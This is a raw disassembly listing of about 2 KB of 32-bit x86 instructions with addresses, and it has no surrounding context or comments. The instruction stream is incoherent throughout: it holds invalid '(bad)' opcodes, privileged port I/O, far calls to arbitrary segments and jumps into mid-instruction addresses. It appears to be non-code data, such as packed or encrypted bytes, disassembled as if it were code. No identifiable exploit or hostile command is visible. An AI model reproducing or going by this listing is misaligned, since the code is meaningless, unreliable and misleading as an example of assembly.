  41c502:	jmp    0x41c4d6
  41c504:	and    BYTE PTR [esi-0x1d],0xd6
  41c508:	fdivr  QWORD PTR [edi+ebx*8-0x79ff86f5]
  41c50f:	aad    0x5a
  41c511:	xchg   esi,eax
  41c512:	jns    0x41c516
  41c514:	cmp    eax,0x637a56e9
  41c519:	ds popa 
  41c51b:	sbb    BYTE PTR [ebp-0x3c],dh
  41c51e:	or     eax,0xaf2cc7a3
  41c523:	mov    eax,ds:0x62e22243
  41c528:	fisubr DWORD PTR [eax-0x60]
  41c52b:	mov    esi,0x1a305df3
  41c530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c531:	in     eax,dx
  41c532:	pusha  
  41c533:	call   0xa7dc:0x62baec5c
  41c53a:	fsubr  st(3),st
  41c53c:	stc    
  41c53d:	sub    al,0x26
  41c53f:	mov    ebx,0x9fa2e3f4
  41c544:	stc    
  41c545:	mov    ecx,0xfaac2b63
  41c54a:	inc    ecx
  41c54b:	aaa    
  41c54c:	or     DWORD PTR [esi-0x4],esi
  41c54f:	xchg   DWORD PTR [esi-0x37],eax
  41c552:	pop    edx
  41c553:	mov    dl,0xd2
  41c555:	aad    0x27
  41c557:	push   eax
  41c558:	jle    0x41c590
  41c55a:	mov    ecx,0xb562bc32
  41c55f:	stc    
  41c560:	inc    ebx
  41c561:	fwait
  41c562:	push   edx
  41c563:	inc    esi
  41c564:	mov    esi,0xe0d4a1a1
  41c569:	lock sbb BYTE PTR [ecx+0x16e75dc0],dl
  41c570:	test   BYTE PTR [ecx-0x15],dh
  41c573:	shl    BYTE PTR [ebx-0x604c63fa],1
  41c579:	inc    edi
  41c57a:	mov    BYTE PTR [di+0x5a],bl
  41c57e:	mov    ah,0xc2
  41c580:	ds inc ebx
  41c582:	loop   0x41c5ca
  41c584:	jo     0x41c5b0
  41c586:	xchg   ecx,eax
  41c587:	ds loope 0x41c55f
  41c58a:	pop    eax
  41c58b:	daa    
  41c58c:	data16 in al,0x0
  41c58f:	add    BYTE PTR [eax],al
  41c591:	add    ch,ah
  41c593:	adc    al,BYTE PTR [edi]
  41c595:	dec    ebx
  41c596:	neg    DWORD PTR [edi-0x13]
  41c599:	mov    esi,0xd2d3b943
  41c59e:	std    
  41c59f:	cwde   
  41c5a0:	mov    dh,0x3f
  41c5a2:	jno    0x41c5e5
  41c5a4:	add    DWORD PTR [eax],eax
  41c5a6:	hlt    
  41c5a7:	add    al,0x0
  41c5a9:	add    BYTE PTR [edi+0x91f2ce1],bl
  41c5af:	jle    0x41c5b3
  41c5b1:	int3   
  41c5b2:	push   esp
  41c5b3:	lahf   
  41c5b4:	sbb    eax,0xf0efb217
  41c5b9:	ret    
  41c5ba:	mul    DWORD PTR [ebp+0x1e]
  41c5bd:	or     ebp,DWORD PTR [esi+0x1a]
  41c5c0:	mov    bl,0x6b
  41c5c2:	and    ah,dh
  41c5c4:	stos   BYTE PTR es:[edi],al
  41c5c5:	and    bh,BYTE PTR ds:0x4e0db63e
  41c5cb:	stc    
  41c5cc:	sti    
  41c5cd:	jmp    0x41c5a5
  41c5cf:	out    dx,al
  41c5d0:	es loop 0x41c5b1
  41c5d3:	cmp    bh,al
  41c5d5:	cmovle edx,DWORD PTR [ecx-0x24]
  41c5d9:	ret    0xd0f4
  41c5dc:	popf   
  41c5dd:	ss xchg edi,eax
  41c5df:	pop    ds
  41c5e0:	mov    ds:0x607ffa90,al
  41c5e5:	(bad)  
  41c5e6:	stc    
  41c5e7:	ins    DWORD PTR es:[edi],dx
  41c5e8:	xor    al,BYTE PTR gs:[ebx+eax*1+0x75fcf017]
  41c5f0:	outs   dx,BYTE PTR ds:[esi]
  41c5f1:	ins    BYTE PTR es:[edi],dx
  41c5f2:	fwait
  41c5f3:	mul    DWORD PTR [ebx+0x77]
  41c5f6:	in     al,0x45
  41c5f8:	jne    0x41c58c
  41c5fa:	mov    ch,0x78
  41c5fc:	mov    al,ds:0xbe65f01b
  41c601:	in     eax,0xe0
  41c603:	mov    ebp,0xa2cb2f9f
  41c608:	pop    esp
  41c609:	ffreep st(6)
  41c60b:	sar    BYTE PTR [ecx-0x54cba481],1
  41c611:	ins    BYTE PTR es:[edi],dx
  41c612:	jp     0xf5055bc5
  41c618:	adc    eax,0xf51e9914
  41c61d:	mov    ecx,0x31374021
  41c622:	jb     0x41c5af
  41c624:	mov    eax,ds:0x3e3a5bc9
  41c629:	out    dx,al
  41c62a:	fadd   DWORD PTR [ecx]
  41c62c:	(bad)  
  41c62d:	cli    
  41c62e:	dec    ecx
  41c62f:	iret   
  41c630:	push   esi
  41c631:	pop    ds
  41c632:	or     bh,BYTE PTR [edi+0x19ddd436]
  41c638:	ss jge 0x41c5c2
  41c63b:	and    bh,BYTE PTR [ebp+0x37]
  41c63e:	add    edx,DWORD PTR [ecx]
  41c640:	je     0x41c66a
  41c642:	in     eax,dx
  41c643:	xchg   edx,eax
  41c644:	xor    bl,ah
  41c646:	sub    ah,ah
  41c648:	shl    esi,1
  41c64a:	stos   BYTE PTR es:[edi],al
  41c64b:	iret   
  41c64c:	cld    
  41c64d:	fwait
  41c64e:	mov    DWORD PTR [eax+0x2c],edx
  41c651:	call   0xa53d:0x4a91bbff
  41c658:	xchg   esp,eax
  41c659:	popf   
  41c65a:	dec    ebx
  41c65b:	sub    al,0x7d
  41c65d:	sub    al,0xaf
  41c65f:	and    eax,esi
  41c661:	fbld   TBYTE PTR [esi+0x1f1d1876]
  41c667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c668:	or     eax,ebx
  41c66a:	(bad)  
  41c66b:	icebp  
  41c66c:	push   esp
  41c66d:	icebp  
  41c66e:	stos   DWORD PTR es:[edi],eax
  41c66f:	sar    DWORD PTR [esi+0x20],1
  41c672:	out    dx,al
  41c673:	test   edi,eax
  41c675:	int    0xcd
  41c677:	out    dx,al
  41c678:	pop    esi
  41c679:	jbe    0x41c685
  41c67b:	imul   edi,DWORD PTR [ecx-0x70f52ef5],0x11
  41c682:	xor    esi,ecx
  41c684:	in     eax,dx
  41c685:	lea    edx,[eax]
  41c687:	scas   al,BYTE PTR es:[edi]
  41c688:	push   ss
  41c689:	cld    
  41c68a:	mov    ch,al
  41c68c:	ds inc ebp
  41c68e:	inc    eax
  41c68f:	sub    eax,0xfe5f33b
  41c694:	mov    eax,0x1550ae98
  41c699:	pop    esi
  41c69a:	lods   eax,DWORD PTR ds:[esi]
  41c69b:	adc    dh,BYTE PTR [edi-0x66a182f8]
  41c6a1:	out    dx,eax
  41c6a2:	inc    esp
  41c6a3:	mov    ah,0x8f
  41c6a5:	adc    al,0xbd
  41c6a7:	dec    edx
  41c6a8:	mov    edi,0x6c51d7f6
  41c6ad:	bound  ebx,QWORD PTR [esi+0x58]
  41c6b0:	inc    eax
  41c6b1:	mov    ah,0x6d
  41c6b3:	pop    edx
  41c6b4:	aad    0xf1
  41c6b6:	cdq    
  41c6b7:	mov    ds:0xbd746b32,eax
  41c6bc:	stos   DWORD PTR es:[edi],eax
  41c6bd:	mov    eax,0x2349b4f6
  41c6c2:	and    al,ch
  41c6c4:	mov    al,0x60
  41c6c6:	(bad)  
  41c6c7:	mov    WORD PTR [esi],fs
  41c6c9:	pop    edx
  41c6ca:	inc    esi
  41c6cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6cc:	mov    DWORD PTR [eax-0x9],ecx
  41c6cf:	fs aaa 
  41c6d1:	push   edx
  41c6d2:	cli    
  41c6d3:	scas   al,BYTE PTR es:[edi]
  41c6d4:	rcl    BYTE PTR [eax-0x13],1
  41c6d7:	arpl   WORD PTR [edx],cx
  41c6d9:	cdq    
  41c6da:	mov    BYTE PTR [esi-0x6d],bh
  41c6dd:	imul   ecx,DWORD PTR [edi+0x403111be],0x839a69d8
  41c6e7:	inc    eax
  41c6e8:	push   ss
  41c6e9:	test   BYTE PTR [edx+0x7c8f6a29],al
  41c6ef:	xor    al,al
  41c6f1:	bound  eax,QWORD PTR [ecx-0x2d18ba03]
  41c6f7:	lods   eax,DWORD PTR ds:[esi]
  41c6f8:	in     al,0xa8
  41c6fa:	mov    cl,0x7d
  41c6fc:	int    0x94
  41c6fe:	repnz outs dx,DWORD PTR ds:[esi]
  41c700:	mov    eax,DWORD PTR [ecx+0x4a]
  41c703:	pop    esp
  41c704:	inc    esp
  41c705:	cdq    
  41c706:	daa    
  41c707:	push   ecx
  41c708:	xor    cl,dl
  41c70a:	pop    ds
  41c70b:	sahf   
  41c70c:	test   BYTE PTR [eax+0xc],al
  41c70f:	js     0x41c780
  41c711:	adc    bl,BYTE PTR [ebp-0xe]
  41c714:	xchg   ebp,eax
  41c715:	and    ebp,eax
  41c717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c718:	rcr    BYTE PTR [edx+0x43ab73fa],0x50
  41c71f:	add    dl,BYTE PTR [ebx]
  41c721:	add    edi,ebp
  41c723:	xchg   ebp,eax
  41c724:	or     eax,0x4293c118
  41c729:	push   es
  41c72a:	mov    al,ds:0x1950eb21
  41c72f:	leave  
  41c730:	stc    
  41c731:	out    dx,ax
  41c733:	lods   al,BYTE PTR ds:[esi]
  41c734:	into   
  41c735:	pop    eax
  41c736:	ret    
  41c737:	je     0x41c710
  41c739:	dec    esp
  41c73a:	das    
  41c73b:	in     eax,0xe2
  41c73d:	(bad)  
  41c73e:	xchg   edi,eax
  41c73f:	jl     0x41c75d
  41c741:	popf   
  41c742:	test   BYTE PTR [esi+0x14dbbd16],al
  41c748:	inc    ebp
  41c749:	out    0x28,al
  41c74b:	mov    al,ds:0xbf633341
  41c750:	pop    ecx
  41c751:	push   edi
  41c752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c753:	aad    0x55
  41c755:	test   eax,0x60bda81b
  41c75a:	mov    dh,0xb
  41c75c:	pusha  
  41c75d:	dec    ecx
  41c75e:	fisubr WORD PTR [edx-0x7b]
  41c761:	add    edx,DWORD PTR [ebp+0x68]
  41c764:	push   ebp
  41c765:	fistp  DWORD PTR [edx]
  41c767:	push   0x468ae8ed
  41c76c:	lea    ebx,[ebp+ecx*8-0x7bdc3950]
  41c773:	push   esi
  41c774:	inc    BYTE PTR ds:0x835146fd
  41c77a:	fs dec ebx
  41c77c:	call   0xe7fef62c
  41c781:	pop    edi
  41c782:	fmul   DWORD PTR [eax+0x78]
  41c785:	aad    0xdc
  41c787:	(bad)  [eax+0xcb90e15]
  41c78d:	mov    edi,0x2fad1019
  41c792:	imul   edx,DWORD PTR [esp+edx*8-0x2140c34b],0x69
  41c79a:	jb     0x41c758
  41c79c:	xchg   ebx,eax
  41c79d:	enter  0x49af,0xd5
  41c7a1:	dec    ebx
  41c7a2:	mov    esi,0x13922997
  41c7a7:	adc    al,0x23
  41c7a9:	jmp    0x47a7112f
  41c7ae:	jb     0x41c7a6
  41c7b0:	scas   al,BYTE PTR es:[edi]
  41c7b1:	fwait
  41c7b2:	mov    ch,BYTE PTR [eax]
  41c7b4:	mov    esp,0xed3c73ce
  41c7b9:	addr16 test al,0xf1
  41c7bc:	mov    eax,0xcc3b3d83
  41c7c1:	push   ebp
  41c7c2:	sub    esi,DWORD PTR ds:0xcf3e6da8
  41c7c8:	ins    DWORD PTR es:[edi],dx
  41c7c9:	(bad)  
  41c7ca:	mov    dl,0x89
  41c7cc:	push   eax
  41c7cd:	or     cl,BYTE PTR [ebp+0x2b]
  41c7d0:	jbe    0x41c7c9
  41c7d2:	xor    DWORD PTR [eax-0x7d69b10f],ebp
  41c7d8:	push   eax
  41c7d9:	jp     0x41c7d8
  41c7db:	arpl   WORD PTR [eax+0x104038cc],dx
  41c7e1:	push   0xd2690ffb
  41c7e6:	cmp    al,0x93
  41c7e8:	push   esp
  41c7e9:	jle    0x41c84a
  41c7eb:	test   eax,0xb2b3db56
  41c7f0:	push   edx
  41c7f1:	jmp    0x6fef:0xf68dbab1
  41c7f8:	out    0xd,al
  41c7fa:	xor    DWORD PTR [ecx-0x4c],edi
  41c7fd:	ins    BYTE PTR es:[edi],dx
  41c7fe:	sahf   
  41c7ff:	(bad)  
  41c800:	xchg   ebx,eax
  41c801:	cmp    DWORD PTR [eax],edi
  41c803:	lods   al,BYTE PTR ds:[esi]
  41c804:	imul   esi,eax,0x54041bae
  41c80a:	xchg   ebx,eax
  41c80b:	xchg   ebx,eax
  41c80c:	jmp    0x41c7a1
  41c80e:	xchg   edx,eax
  41c80f:	mov    ebp,0x79579ca2
  41c814:	call   0x873:0x6e5d0afc
  41c81b:	sub    bl,BYTE PTR [ebx-0x782a2dad]
  41c821:	xchg   esp,eax
  41c822:	pop    ds
  41c823:	pop    ds
  41c824:	or     esp,DWORD PTR [ecx+esi*1+0x3]
  41c828:	mov    cl,0x57
  41c82a:	(bad)  
  41c82b:	mov    al,0x8c
  41c82d:	lods   eax,DWORD PTR ds:[esi]
  41c82e:	add    dh,BYTE PTR ds:0x83922004
  41c834:	xchg   ebx,eax
  41c835:	xchg   edi,eax
  41c836:	lock aad 0x68
  41c839:	push   edx
  41c83a:	in     al,0x34
  41c83c:	jmp    0x83d00deb
  41c841:	aaa    
  41c842:	adc    DWORD PTR [edi+ecx*8],ecx
  41c845:	mov    esi,0xe0c565b
  41c84a:	mov    eax,ds:0x448dfb72
  41c84f:	xor    eax,0xdf97f4bc
  41c854:	and    eax,0xe88b51e4
  41c859:	loopne 0x41c877
  41c85b:	adc    BYTE PTR [ecx-0x21],0xf7
  41c85f:	outs   dx,BYTE PTR ds:[esi]
  41c860:	push   ss
  41c861:	xchg   ebx,eax
  41c862:	xor    bl,BYTE PTR [eax-0x7e5ceb73]
  41c868:	cli    
  41c869:	sahf   
  41c86a:	ds je  0x41c838
  41c86d:	ja     0x41c8bc
  41c86f:	addr16 push edx
  41c871:	aad    0xd1
  41c873:	jae    0x41c8c1
  41c875:	mov    dh,0xd2
  41c877:	bound  esi,QWORD PTR [ebx+0x1b6ee70c]
  41c87d:	scas   eax,DWORD PTR es:[edi]
  41c87e:	add    DWORD PTR [ebx-0x59],ebp
  41c881:	repnz int3 
  41c883:	dec    ecx
  41c884:	adc    bl,BYTE PTR [edx]
  41c886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c887:	je     0x41c88f
  41c889:	loopne 0x41c87e
  41c88b:	add    al,0xae
  41c88d:	es addr16 xchg ebp,eax
  41c890:	or     eax,0x25afee6e
  41c895:	jo     0x41c85e
  41c897:	loopne 0x41c81f
  41c899:	bound  edx,QWORD PTR [esi+ecx*2+0x5ab81c5b]
  41c8a0:	scas   al,BYTE PTR es:[edi]
  41c8a1:	push   ebx
  41c8a2:	gs loop 0x41c8b6
  41c8a5:	adc    al,0x76
  41c8a7:	sti    
  41c8a8:	mov    eax,0x4b2d9e3b
  41c8ad:	and    eax,0xb22e798f
  41c8b2:	dec    esi
  41c8b3:	sbb    eax,0xa19bf9ae
  41c8b8:	test   al,0xbc
  41c8ba:	loop   0x41c8a7
  41c8bc:	or     al,0x9b
  41c8be:	stos   BYTE PTR es:[edi],al
  41c8bf:	out    dx,eax
  41c8c0:	add    eax,0x1e5d0f50
  41c8c5:	xor    eax,0xd5cee1d0
  41c8ca:	xchg   ebp,eax
  41c8cb:	ret    
  41c8cc:	add    bl,BYTE PTR [eax+0x49]
  41c8cf:	push   0x53a37d75
  41c8d4:	xor    ebp,DWORD PTR [edi+0x3d03f31b]
  41c8da:	shr    BYTE PTR [ebx+0x1fd72c4d],1
  41c8e0:	mov    BYTE PTR [ecx-0x2b],ah
  41c8e3:	fadd   st,st(6)
  41c8e5:	adc    al,0x98
  41c8e7:	mov    ds:0xa479b02d,al
  41c8ec:	sbb    DWORD PTR [ebp-0x75],edx
  41c8ef:	shl    DWORD PTR [esi-0x39bfd6fb],0x3e
  41c8f6:	lods   al,BYTE PTR ds:[esi]
  41c8f7:	out    dx,al
  41c8f8:	sub    bl,ch
  41c8fa:	pop    edx
  41c8fb:	(bad)  
  41c8fc:	mov    DWORD PTR [ebp+0x66],ebx
  41c8ff:	jb     0x41c96b
  41c901:	call   0x88f:0x5b712513
  41c908:	retf   0xbe45
  41c90b:	jge    0x41c946
  41c90d:	es pop ebx
  41c90f:	jb     0x41c8a2
  41c911:	push   esp
  41c912:	dec    eax
  41c913:	xor    BYTE PTR [eax-0x3fedefe1],ch
  41c919:	and    al,bl
  41c91b:	rcr    ebp,cl
  41c91d:	outs   dx,BYTE PTR ds:[esi]
  41c91e:	pusha  
  41c91f:	es or  al,0xfb
  41c922:	fst    DWORD PTR [eax+0x1eb0d57a]
  41c928:	psubb  mm5,QWORD PTR [ebx]
  41c92b:	cli    
  41c92c:	push   ss
  41c92d:	aaa    
  41c92e:	xchg   ecx,eax
  41c92f:	xchg   edi,eax
  41c930:	push   esp
  41c931:	push   ecx
  41c932:	fadd   DWORD PTR [ecx+ebp*2]
  41c935:	dec    esp
  41c936:	aam    0xe1
  41c938:	in     eax,0x80
  41c93a:	mov    es,WORD PTR [ebx]
  41c93c:	cmp    DWORD PTR [edi],ebx
  41c93e:	xchg   ebp,eax
  41c93f:	mov    bh,BYTE PTR [eax+0x10387f59]
  41c945:	add    dh,BYTE PTR [ebp+0xa6d6f97]
  41c94b:	adc    ebx,DWORD PTR [edi+0x6d]
  41c94e:	test   eax,0x5165c892
  41c953:	nop
  41c954:	test   BYTE PTR [ebx+0x57],dl
  41c957:	or     eax,0xb2096919
  41c95c:	shl    DWORD PTR [esi+0x59],cl
  41c95f:	and    BYTE PTR ss:[edi+0x73c899be],ch
  41c966:	int    0xd1
  41c968:	and    bh,BYTE PTR [eax+0x777b7e81]
  41c96e:	mov    edi,0x6cdc5157
  41c973:	stos   DWORD PTR es:[edi],eax
  41c974:	add    dh,bh
  41c976:	repnz mov eax,0x91a65c2a
  41c97c:	scas   eax,DWORD PTR es:[edi]
  41c97d:	int3   
  41c97e:	scas   al,BYTE PTR es:[edi]
  41c97f:	dec    edi
  41c980:	ins    DWORD PTR es:[edi],dx
  41c981:	ja     0x41c989
  41c983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c984:	jnp    0x41c9e4
  41c986:	in     eax,dx
  41c987:	ds jae 0x41c9f0
  41c98a:	sar    DWORD PTR [edi],cl
  41c98c:	out    0x97,al
  41c98e:	sbb    esp,DWORD PTR [ebx+0x79]
  41c991:	repz aam 0x53
  41c994:	jg     0x41c9c2
  41c996:	add    al,0x69
  41c998:	lahf   
  41c999:	je     0x41c960
  41c99b:	pop    esp
  41c99c:	(bad)  [eax-0x2a15a18e]
  41c9a2:	scas   al,BYTE PTR es:[edi]
  41c9a3:	mov    dl,0x9e
  41c9a5:	push   ss
  41c9a6:	ds aaa 
  41c9a8:	enter  0x11b8,0xf6
  41c9ac:	popa   
  41c9ad:	jge    0x41c939
  41c9af:	xchg   ebx,eax
  41c9b0:	push   ebp
  41c9b1:	dec    edx
  41c9b2:	push   edi
  41c9b3:	popa   
  41c9b4:	outs   dx,DWORD PTR ds:[esi]
  41c9b5:	mov    ds:0x83af78e,al
  41c9ba:	imul   edx,DWORD PTR [edi+0x33edcec1],0xa7db09d2
  41c9c4:	in     eax,dx
  41c9c5:	out    0x14,al
  41c9c7:	jne    0x41ca2b
  41c9c9:	add    bl,0x25
  41c9cc:	lock loope 0x41ca19
  41c9cf:	and    eax,0x9d50a321
  41c9d4:	xor    edi,DWORD PTR [ebp+0x30]
  41c9d7:	mov    esi,0x74833fc1
  41c9dc:	mov    BYTE PTR [edx+0x53],bh
  41c9df:	jg     0x41c9ec
  41c9e1:	cmp    BYTE PTR [ecx-0x1378ec14],ch
  41c9e7:	sub    BYTE PTR [edx+0x37],bh
  41c9ea:	sub    BYTE PTR [edx+0xc67aac],al
  41c9f0:	push   0x58509f76
  41c9f5:	fmul   DWORD PTR [ecx-0x53]
  41c9f8:	sbb    eax,0xef5f61b8
  41c9fd:	ins    BYTE PTR es:[edi],dx
  41c9fe:	dec    eax
  41c9ff:	mov    esi,0xe31d5676
  41ca04:	inc    esp
  41ca05:	adc    BYTE PTR [esi+0x5b026557],ah
  41ca0b:	fbld   TBYTE PTR ds:0x184aa7c7
  41ca11:	lods   al,BYTE PTR ds:[esi]
  41ca12:	push   cs
  41ca13:	sti    
  41ca14:	outs   dx,DWORD PTR ds:[esi]
  41ca15:	inc    eax
  41ca16:	sbb    ecx,ebx
  41ca18:	fadd   QWORD PTR ds:0xf6725f56
  41ca1e:	push   es
  41ca1f:	mov    al,ds:0x799f8fe2
  41ca24:	push   0xffffffc2
  41ca26:	xor    BYTE PTR [esi-0x1f7d1cb6],ah
  41ca2c:	ins    BYTE PTR es:[edi],dx
  41ca2d:	push   ss
  41ca2e:	jbe    0x41c9e3
  41ca30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca31:	xor    al,0xe5
  41ca33:	sahf   
  41ca34:	ins    DWORD PTR es:[edi],dx
  41ca35:	adc    bh,ah
  41ca37:	imul   esi,DWORD PTR [ebp-0x42],0x46
  41ca3b:	sub    al,0x99
  41ca3d:	neg    BYTE PTR [eax]
  41ca3f:	sub    cl,BYTE PTR [esi+0x70]
  41ca42:	mov    ebp,0x6d4e07a8
  41ca47:	test   eax,0xb4a5c03a
  41ca4c:	push   cs
  41ca4d:	imul   eax,DWORD PTR [eax-0x7f],0x38fa4f00
  41ca54:	aaa    
  41ca55:	ds jl  0x41caa9
  41ca58:	pop    es
  41ca59:	jecxz  0x41ca87
  41ca5b:	sti    
  41ca5c:	xor    BYTE PTR [eax+0x6],0xe9
  41ca60:	push   ss
  41ca61:	enter  0x5bda,0xa2
  41ca65:	xor    bh,BYTE PTR [ebx]
  41ca67:	mov    esp,0xf9524633
  41ca6c:	cs xor ch,ch
  41ca6f:	test   eax,ebp
  41ca71:	add    edx,edx
  41ca73:	call   0xc51deb41
  41ca78:	sar    ah,cl
  41ca7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca7b:	retf   0x594e
  41ca7e:	bound  edx,QWORD PTR [edx+0x7c]
  41ca81:	push   eax
  41ca82:	dec    ebx
  41ca83:	pusha  
  41ca84:	daa    
  41ca85:	cmp    al,0x8d
  41ca87:	jno    0x41ca2c
  41ca89:	fldenv [edi-0x63b93957]
  41ca8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca90:	jns    0x41cabc
  41ca92:	push   ds
  41ca93:	call   0xacd0eb2e
  41ca98:	mov    eax,ds:0x80f1101b
  41ca9d:	sahf   
  41ca9e:	add    BYTE PTR [eax],al
  41caa0:	add    BYTE PTR [eax],al
  41caa2:	in     al,0x3e
  41caa4:	mov    esp,ss
  41caa6:	fdivrp st(6),st
  41caa8:	cld    
  41caa9:	ds push esp
  41caab:	daa    
  41caac:	cmp    esi,DWORD PTR [edx-0x60]
  41caaf:	add    cl,BYTE PTR [ecx]
  41cab1:	stc    
  41cab2:	gs inc esi
  41cab4:	add    DWORD PTR [eax],eax
  41cab6:	hlt    
  41cab7:	add    al,0x0
  41cab9:	add    BYTE PTR [edx-0x74a7c66e],ch
  41cabf:	ret    0x3dd4
  41cac2:	scas   al,BYTE PTR es:[edi]
  41cac3:	push   eax
  41cac4:	adc    al,BYTE PTR [edi-0x5097e6f1]
  41caca:	mov    esp,0x16ccf3c9
  41cacf:	ds jge 0x41ca9e
  41cad2:	push   esi
  41cad3:	cmp    ebx,ecx
  41cad5:	xchg   DWORD PTR [edx-0x41617144],esi
  41cadb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cadc:	dec    edi
  41cadd:	and    BYTE PTR [ebp-0x25d45af3],0xe0
  41cae4:	jmp    0x41ca82
  41cae6:	popf   
  41cae7:	repz test DWORD PTR ds:0x52dc476e,ebx
  41caee:	jg     0x41cb2e
  41caf0:	xchg   ebp,eax
  41caf1:	push   0xd9ab59a2
  41caf6:	sub    BYTE PTR [ecx-0x9763b76],cl
  41cafc:	mov    ch,0x18
  41cafe:	dec    esp
  41caff:	jno    0x41caea
  41cb01:	sti    
  41cb02:	jo     0x41cb4a
  41cb04:	jmp    0xd2ff7282
  41cb09:	les    edx,FWORD PTR [ecx-0x1a0cb768]
  41cb0f:	mov    dl,0x6d
  41cb11:	sahf   
  41cb12:	mov    al,ds:0x1306d6ea
  41cb17:	imul   edx,DWORD PTR [ecx],0x2
  41cb1a:	dec    ecx
  41cb1b:	(bad)  
  41cb1d:	jo     0x41caaf
  41cb1f:	clc    
  41cb20:	dec    eax
  41cb21:	int3   
  41cb22:	push   es
  41cb23:	ror    BYTE PTR [eax+0x39],0xa9
  41cb27:	loopne 0x41cb9f
  41cb29:	lea    esi,[ecx-0x69]
  41cb2c:	mov    ecx,0x2a5690d1
  41cb31:	popf   
  41cb32:	ds add eax,0xcf4325a2
  41cb38:	dec    edx
  41cb39:	push   esi
  41cb3a:	adc    bl,BYTE PTR [ebx]
  41cb3c:	not    DWORD PTR [ebx]
  41cb3e:	retf   
  41cb3f:	sbb    BYTE PTR [edi-0xfc82f0f],0xbd
  41cb46:	test   BYTE PTR [esi],bh
  41cb48:	(bad)  
  41cb49:	outs   dx,DWORD PTR ds:[esi]
  41cb4a:	outs   dx,BYTE PTR ds:[esi]
  41cb4b:	jge    0x41cad3
  41cb4d:	repnz add eax,0x8ec046d2
  41cb53:	pop    edx
  41cb54:	call   0x360a:0xd7197af5
  41cb5b:	(bad)  
  41cb5c:	mov    BYTE PTR [ecx],ah
  41cb5e:	int    0xf7
  41cb60:	cmc    
  41cb61:	into   
  41cb62:	sbb    DWORD PTR ds:0x200acbe6,esi
  41cb68:	add    edx,DWORD PTR [esi-0x330aa90b]
  41cb6e:	add    eax,0x9f0c2aec
  41cb73:	adc    ecx,DWORD PTR [ecx+0x2f]
  41cb76:	inc    esi
  41cb77:	xchg   esi,eax
  41cb78:	call   0x1282:0x6668a724
  41cb7f:	cmp    ah,bh
  41cb81:	adc    eax,0x659d81ce
  41cb86:	pop    edx
  41cb87:	jp     0x41cb3f
  41cb89:	mov    ds:0x41dd621f,al
  41cb8e:	cli    
  41cb8f:	add    esi,DWORD PTR ds:0xb80a66b3
  41cb95:	push   eax
  41cb96:	jmp    DWORD PTR [eax+eax*8-0x5]
  41cb9a:	adc    al,0x1e
  41cb9c:	inc    eax
  41cb9d:	jne    0x41cc10
  41cb9f:	adc    eax,0x2a71528a
  41cba4:	shl    BYTE PTR [edi-0x5d],1
  41cba7:	or     esi,DWORD PTR [eax-0x23409dfc]
  41cbad:	and    al,BYTE PTR [edx-0x704b990e]
  41cbb3:	jmp    0xb6d2:0x59bb15e7
  41cbba:	pusha  
  41cbbb:	test   BYTE PTR [edi],cl
  41cbbd:	and    BYTE PTR [edi-0x3b],bh
  41cbc0:	cwde   
  41cbc1:	test   DWORD PTR [edi+edx*8],0x5828bda1
  41cbc8:	(bad)  
  41cbc9:	repnz nop
  41cbcb:	jp     0x41cb67
  41cbcd:	adc    al,0x50
  41cbcf:	loop   0x41cbf5
  41cbd1:	mov    esi,0x5b5cd25e
  41cbd6:	cmp    edi,esp
  41cbd8:	nop    ebp
  41cbdb:	dec    edx
  41cbdc:	add    ah,BYTE PTR ds:0x6fb9182
  41cbe2:	dec    eax
  41cbe3:	dec    esp
  41cbe4:	pop    edx
  41cbe5:	das    
  41cbe6:	arpl   WORD PTR [eax],di
  41cbe8:	ficom  WORD PTR [eax+0xe22cfa4]
  41cbee:	outs   dx,BYTE PTR ds:[esi]
  41cbef:	adc    bh,al
  41cbf1:	mov    bl,0x9b
  41cbf3:	push   edx
  41cbf4:	arpl   cx,di
  41cbf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbf7:	int    0x16
  41cbf9:	push   edi
  41cbfa:	jge    0x41cc02
  41cbfc:	fistp  QWORD PTR [ebx]
  41cbfe:	mov    DWORD PTR [esi],ebx
  41cc00:	aas    
  41cc01:	lods   eax,DWORD PTR ds:[esi]
  41cc02:	leave  
  41cc03:	sar    DWORD PTR [ecx-0x725227d3],1
  41cc09:	ss add al,0x1d
  41cc0c:	stos   DWORD PTR es:[edi],eax
  41cc0d:	icebp  
  41cc0e:	clc    
  41cc0f:	ror    DWORD PTR [ebx],cl
  41cc11:	out    dx,al
  41cc12:	mov    ah,0xd
  41cc14:	mov    WORD PTR [edi],es
  41cc16:	inc    esp
  41cc17:	mov    bl,0x4b
  41cc19:	retf   
  41cc1a:	sub    esi,DWORD PTR fs:[ebx-0x37]
  41cc1e:	jae    0x41cbef
  41cc20:	mov    al,BYTE PTR [ebx-0x17]
  41cc23:	iret   
  41cc24:	push   esp
  41cc25:	xchg   ecx,eax
  41cc26:	into   
  41cc27:	imul   bh
  41cc29:	adc    al,0x3d
  41cc2b:	xor    BYTE PTR [ecx+0x1c44cac7],0x43
  41cc32:	retf   0x4248
  41cc35:	push   ecx
  41cc36:	xchg   DWORD PTR [eax],ecx
  41cc38:	sub    eax,0x876118d3
  41cc3d:	adc    BYTE PTR [eax+0x2a],bl
  41cc40:	sub    bh,BYTE PTR [ebx-0x29]
  41cc43:	push   ebp
  41cc44:	retf   0x73d8
  41cc47:	addr16 mov dh,0x33
  41cc4a:	call   0x723bda6b
  41cc4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc50:	loop   0x41cbef
  41cc52:	pop    esp
  41cc53:	dec    edx
  41cc54:	ja     0x41cc86
  41cc56:	out    0x4b,al
  41cc58:	je     0x41cc8e
  41cc5a:	jecxz  0x41cc47
  41cc5c:	retf   0x8373
  41cc5f:	mov    edx,0x5a0e4999
  41cc64:	sub    BYTE PTR [ecx],0xce
  41cc67:	in     al,dx
  41cc68:	cmc    
  41cc69:	retf   0x82af
  41cc6c:	shl    BYTE PTR [esi+0x3a],1
